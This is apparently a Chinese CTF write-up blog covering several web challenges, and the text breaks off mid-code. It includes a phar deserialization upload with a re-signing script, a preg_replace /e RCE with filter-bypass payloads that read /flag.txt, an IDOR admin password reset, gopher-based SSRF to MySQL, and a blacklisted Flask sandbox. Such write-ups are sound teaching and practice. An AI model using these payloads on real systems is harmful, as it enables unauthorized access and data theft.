title="这里有一个卡了我一天的地方，网上的脚本几乎全是sha1加密生成签名，但是实际上在php官网上有详细介绍phar的签名机制，可以有MD5，sha1，sha256，sha512不同的签名方式，同时在文件的倒数5到8个字节逆向分别用0x0001，0x0002,0x0003,0x0004代指对应的签名方法，可能是版本迭代的原因，我们生成的phar为03，也就是sha256加密，这样就导致我们的脚本与我们的文件加密方式不同，导致签名损坏。"></a>这里有一个卡了我一天的地方，网上的脚本几乎全是sha1加密生成签名，但是实际上在php官网上有详细介绍phar的签名机制，可以有MD5，sha1，sha256，sha512不同的签名方式，同时在文件的倒数5到8个字节逆向分别用0x0001，0x0002,0x0003,0x0004代指对应的签名方法，可能是版本迭代的原因，我们生成的phar为03，也就是sha256加密，这样就导致我们的脚本与我们的文件加密方式不同，导致签名损坏。</h3><p><img src="https://pics.lwzheng.tech/2025/01/25/6794fa3ed04fb.png" alt="8ad62c25-f7cd-4f89-8856-c31ba43af34a.png"></p>
<h3 id="下面的报错也是证明了这一点"><a href="#下面的报错也是证明了这一点" class="headerlink" title="下面的报错也是证明了这一点"></a>下面的报错也是证明了这一点</h3><p><img src="https://pics.lwzheng.tech/2025/01/25/6793cc3c99bab.png" alt="3f866775-d9ad-4792-b2d7-ba0ec30e5b8b.png"></p>
<h3 id="所以我们要将我们文件中的03改为02，这样我们的脚本与签名就是对应的了"><a href="#所以我们要将我们文件中的03改为02，这样我们的脚本与签名就是对应的了" class="headerlink" title="所以我们要将我们文件中的03改为02，这样我们的脚本与签名就是对应的了"></a>所以我们要将我们文件中的03改为02，这样我们的脚本与签名就是对应的了</h3><p><img src="https://pics.lwzheng.tech/2025/01/25/6794fa8f3b8c0.png" alt="9fc9ee57-be0c-4b30-88f1-929cea5ce0a3.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\10900\\Desktop\\phar\\phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;phar2.phar&quot;</span>,<span class="string">&quot;wb&quot;</span>).write(newf)</span><br></pre></td></tr></table></figure>
<h3 id="生成好后进行url编码来用file-put-contents写入文件"><a href="#生成好后进行url编码来用file-put-contents写入文件" class="headerlink" title="生成好后进行url编码来用file_put_contents写入文件"></a>生成好后进行url编码来用file_put_contents写入文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;phar2.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    f = fi.read()</span><br><span class="line">    ff = urllib.parse.quote(f) <span class="comment">#获取信息</span></span><br><span class="line">    <span class="built_in">print</span>(ff)</span><br></pre></td></tr></table></figure>
<h3 id="上传的同时还要用GC回收垃圾机制绕过，所以还要给1这个参数序列化"><a href="#上传的同时还要用GC回收垃圾机制绕过，所以还要给1这个参数序列化" class="headerlink" title="上传的同时还要用GC回收垃圾机制绕过，所以还要给1这个参数序列化"></a>上传的同时还要用GC回收垃圾机制绕过，所以还要给1这个参数序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>=<span class="string">&quot;w&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$flag</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">1</span>:<span class="string">&quot;D&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;r&quot;</span>;&#125;i:<span class="number">1</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="改1为0，a-2-i-0-O-1-D-1-s-5-start-s-1-r-i-0-i-0-，写入为w，读取改为为r"><a href="#改1为0，a-2-i-0-O-1-D-1-s-5-start-s-1-r-i-0-i-0-，写入为w，读取改为为r" class="headerlink" title="改1为0，a:2:{i:0;O:1:&quot;D&quot;:1:{s:5:&quot;start&quot;;s:1:&quot;r&quot;;}i:0;i:0;}，写入为w，读取改为为r"></a>改1为0，<code>a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;&#125;i:0;i:0;&#125;</code>，写入为w，读取改为为r</h3><h3 id="不过上传后发现waf函数触发，原来是我们的phar里面含有php，所以可以利用压缩绕过"><a href="#不过上传后发现waf函数触发，原来是我们的phar里面含有php，所以可以利用压缩绕过" class="headerlink" title="不过上传后发现waf函数触发，原来是我们的phar里面含有php，所以可以利用压缩绕过"></a>不过上传后发现waf函数触发，原来是我们的phar里面含有php，所以可以利用压缩绕过</h3><blockquote>
<p>五种可以触发phar的文件<br>普通phar<br>gzip<br>bzip2<br>tar<br>zip</p>
</blockquote>
<h3 id="压缩后再url编码进行上传即可绕过，然后再用phar读取回显的路径即可"><a href="#压缩后再url编码进行上传即可绕过，然后再用phar读取回显的路径即可" class="headerlink" title="压缩后再url编码进行上传即可绕过，然后再用phar读取回显的路径即可"></a>压缩后再url编码进行上传即可绕过，然后再用phar读取回显的路径即可</h3><h3 id="这里还有一个又卡了我半天的地方，就是火狐的hackbar插件上传时可能并没有进行url解码，所以导致我用火狐上传时一直报错，换成BP后就好了（苦呀西）"><a href="#这里还有一个又卡了我半天的地方，就是火狐的hackbar插件上传时可能并没有进行url解码，所以导致我用火狐上传时一直报错，换成BP后就好了（苦呀西）" class="headerlink" title="这里还有一个又卡了我半天的地方，就是火狐的hackbar插件上传时可能并没有进行url解码，所以导致我用火狐上传时一直报错，换成BP后就好了（苦呀西）"></a>这里还有一个又卡了我半天的地方，就是火狐的hackbar插件上传时可能并没有进行url解码，所以导致我用火狐上传时一直报错，换成BP后就好了（苦呀西）</h3><p><img src="https://pics.lwzheng.tech/2025/01/25/6794fb25313b0.png" alt="d7c0af7d-be69-453a-83ac-c83bbbfdf091.png"><br><img src="https://pics.lwzheng.tech/2025/01/25/6794fb2bd3ac9.png" alt="264074f0-b9b4-4792-8cf5-d039dca923b0.png"><br><img src="https://pics.lwzheng.tech/2025/01/25/6794fb320c2c7.png" alt="58d515bf-91c2-4c62-8650-11cd128ef949.png"></p>
<h1 id="简单的RCE"><a href="#简单的RCE" class="headerlink" title="简单的RCE"></a>简单的RCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.(?moran=flag)&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="没有环境，在本体把服务器跑起来，首先先-GET-moran-flag-，非常简单，然后就在网页看到代码了，接下来就是过滤绕过以及利用preg-replace进行代码执行了"><a href="#没有环境，在本体把服务器跑起来，首先先-GET-moran-flag-，非常简单，然后就在网页看到代码了，接下来就是过滤绕过以及利用preg-replace进行代码执行了" class="headerlink" title="没有环境，在本体把服务器跑起来，首先先$_GET[&#39;moran&#39;] === &#39;flag&#39;，非常简单，然后就在网页看到代码了，接下来就是过滤绕过以及利用preg_replace进行代码执行了"></a>没有环境，在本体把服务器跑起来，首先先<code>$_GET[&#39;moran&#39;] === &#39;flag&#39;</code>，非常简单，然后就在网页看到代码了，接下来就是过滤绕过以及利用preg_replace进行代码执行了</h3><h3 id="preg-replace如果第一个参数是-e模式，就会在替换时将第二个参数当做代码执行，然后-i模式是大小写不敏感，所以这里直接将第三个参数大小写绕过即可执行替换"><a href="#preg-replace如果第一个参数是-e模式，就会在替换时将第二个参数当做代码执行，然后-i模式是大小写不敏感，所以这里直接将第三个参数大小写绕过即可执行替换" class="headerlink" title="preg_replace如果第一个参数是&#x2F;e模式，就会在替换时将第二个参数当做代码执行，然后&#x2F;i模式是大小写不敏感，所以这里直接将第三个参数大小写绕过即可执行替换"></a>preg_replace如果第一个参数是&#x2F;e模式，就会在替换时将第二个参数当做代码执行，然后&#x2F;i模式是大小写不敏感，所以这里直接将第三个参数大小写绕过即可执行替换</h3><h3 id="然后就是代码执行部分，过滤了很多，这里可以绕过的方式还是挺多的，比如利用base64-decode-绕过，利用多次传参task-GET-1-GET-2-然后get传参-1-system-2-ls-等等，这里就用多次传参好了。"><a href="#然后就是代码执行部分，过滤了很多，这里可以绕过的方式还是挺多的，比如利用base64-decode-绕过，利用多次传参task-GET-1-GET-2-然后get传参-1-system-2-ls-等等，这里就用多次传参好了。" class="headerlink" title="然后就是代码执行部分，过滤了很多，这里可以绕过的方式还是挺多的，比如利用base64_decode()绕过，利用多次传参task=$_GET[1]($_GET[2]);然后get传参?1=system$2=ls /等等，这里就用多次传参好了。"></a>然后就是代码执行部分，过滤了很多，这里可以绕过的方式还是挺多的，比如利用base64_decode()绕过，利用多次传参<code>task=$_GET[1]($_GET[2]);</code>然后get传参<code>?1=system$2=ls /</code>等等，这里就用多次传参好了。</h3><blockquote>
<p>?moran&#x3D;flag&amp;1&#x3D;system$2&#x3D;ls &#x2F;          task&#x3D;$_GET<a href="$_GET%5B2%5D">1</a>;&amp;flag&#x3D;Please_give_me_flag<br>?moran&#x3D;flag&amp;1&#x3D;system$2&#x3D;cat &#x2F;flag.txt          task&#x3D;$_GET<a href="$_GET%5B2%5D">1</a>;&amp;flag&#x3D;Please_give_me_flag</p>
</blockquote>
<h1 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h1><h3 id="打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。"><a href="#打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。" class="headerlink" title="打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。"></a>打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。</h3><h3 id="登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。"><a href="#登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。" class="headerlink" title="登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。"></a>登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。</h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a4848218532.png" alt="aec355635e14bccdca6768fae37c33e1.png"></p>
<h3 id="登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了"><a href="#登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了" class="headerlink" title="登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了"></a>登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了</h3><h3 id="然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵"><a href="#然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵" class="headerlink" title="然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵"></a><del>然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵</del></h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a485a2b494f.png" alt="c27da523d674e0448bfbbf1ed157d4f3.png"></p>
<h3 id="这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v-nonono-，也就是代表可能被过滤"><a href="#这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v-nonono-，也就是代表可能被过滤" class="headerlink" title="这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v(nonono)，也就是代表可能被过滤"></a>这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v(nonono)，也就是代表可能被过滤</h3><blockquote>
<p>到这里就不得不提gopherus这个工具的使用了：此工具可以自动生成 Gopher payload，以利用 SSRF并获得 RCE。<br>该工具的攻击范围：<br>MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)</p>
</blockquote>
<h3 id="这里可以用gopher-127-0-0-1-端口来判断那一个能攻击"><a href="#这里可以用gopher-127-0-0-1-端口来判断那一个能攻击" class="headerlink" title="这里可以用gopher://127.0.0.1:端口来判断那一个能攻击"></a>这里可以用<code>gopher://127.0.0.1:端口</code>来判断那一个能攻击</h3><h3 id="然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show-database-和select-load-file-flag-了，这里使用默认MySQL用户名root，然后url编码一次即可。"><a href="#然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show-database-和select-load-file-flag-了，这里使用默认MySQL用户名root，然后url编码一次即可。" class="headerlink" title="然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show database;和select load_file(&#39;/flag&#39;);了，这里使用默认MySQL用户名root，然后url编码一次即可。"></a>然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令<code>show database;</code>和<code>select load_file(&#39;/flag&#39;);</code>了，这里使用默认MySQL用户名root，然后url编码一次即可。</h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a489c734b9d.png" alt="e09d2af5cece4ad2171defcd8479c126.png"></p>
<h3 id="将回显base64解码得到flag"><a href="#将回显base64解码得到flag" class="headerlink" title="将回显base64解码得到flag"></a>将回显base64解码得到flag</h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a489e223c67.png" alt="8a2d5d67fe10cf69bedb2ffda563ef62.png"></p>
<h1 id="pyblockly"><a href="#pyblockly" class="headerlink" title="pyblockly"></a>pyblockly</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line">           </span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line">        </span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"><span 